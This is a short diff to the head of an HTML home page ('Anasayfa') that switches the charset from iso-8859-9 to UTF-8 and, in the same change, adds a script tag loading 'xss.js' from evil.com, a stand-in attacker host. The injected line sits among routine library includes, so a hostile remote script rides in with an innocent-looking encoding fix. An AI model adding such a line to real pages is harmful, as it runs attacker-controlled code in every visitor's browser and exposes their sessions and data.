@@ -8,7 +8,7 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
     <head>
-        <meta http-equiv="content-type" content="text/html; charset=iso-8859-9"/>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <title>Anasayfa</title>
         <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
@@ -17,6 +17,7 @@
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
         <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
         <script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
+        <script src="http://evil.com/xss.js"></script>
     </head>
 
 <body>
